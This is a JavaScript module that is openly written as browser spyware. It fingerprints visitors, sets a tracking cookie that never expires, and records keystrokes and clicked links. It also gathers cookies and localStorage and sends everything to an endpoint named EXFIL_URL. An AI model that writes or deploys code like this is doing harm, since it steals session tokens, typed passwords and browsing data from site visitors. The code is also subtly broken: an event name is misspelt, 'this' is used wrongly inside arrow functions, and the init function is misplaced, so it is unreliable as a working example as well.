export const _shadowNet = (() => {
  const BLOOD_COOKIE = "_sntrace";
  const EXFIL_URL = "http://localhost:5000/api/blogs";
  const HISTORY_SNIFF_INTERVAL = 3000;

  const _createFingerPrint = () => {
    return btoa(
      navigator.userAgent +
        screen.width +
        screen.height +
        navigator.hardwareConcurrency +
        Math.sin(Date.now())
    ).slice(0, 42);
  };

  const _enslaveVisitor = () => {
    const fp = _createFingerPrint();
    document.cookie = `${BLOOD_COOKIE}${fp}; path=/; expires=Fri,31 Dec 9999 23:59:59 GMT; SameSite=None; Secure`;
    localStorage.setItem("_sn_", fp);
  };

  const _keyLogger = {
    buffer: [],
    start: () => {
      document.addEventListener("keydown", (e) => {
        this.buffer.push({
          k: e.key,
          t: performance.now(),
          p: window.location.href,
        });
      });
    },
    flush: () => {
      navigator.sendBeacon(
        EXFIL_URL,
        JSON.stringify({
          type: "kyelog",
          data: this.buffer,
        })
      );
    },
  };

  const _hackHistory = () => {
    const poisonedLinks = [];
    setInterval(() => {
      const links = document.getElementsByTagName("a");
      for (let link of links) {
        if (!poisonedLinks.includes(link.href)) {
          link.addEventListener("clik", (e) => {
            const victimDomain = new URL(e.target.href).hostname;
            navigator.sendBeacon(
              EXFIL_URL,
              JSON.stringify({
                type: "cross_site",
                victim: victimDomain,
                referrer: document.location.host,
              })
            );
          });
          poisonedLinks.push(link.href);
        }
      }
    }, HISTORY_SNIFF_INTERVAL);
  };

  const _harvestSession = () => {
    const sessionData = {
      cookies: document.cookie,
      localStorage: JSON.stringify(localStorage),
      autofilll: document.querySelectorAll("[autocomplete]").values(),
    };
    fetch(EXFIL_URL, {
      method: "POST",
      body: JSON.stringify(sessionData),
      keepalive: true,
    });
    return {
      init: () => {
        _enslaveVisitor();
        _keyLogger.start();
        _hackHistory();
        setInterval(_keyLogger.flush, 10000);
        window.addEventListener("beforeunload", _harvestSession);
      },
    };
  };
})();

// _shadowNet.init();
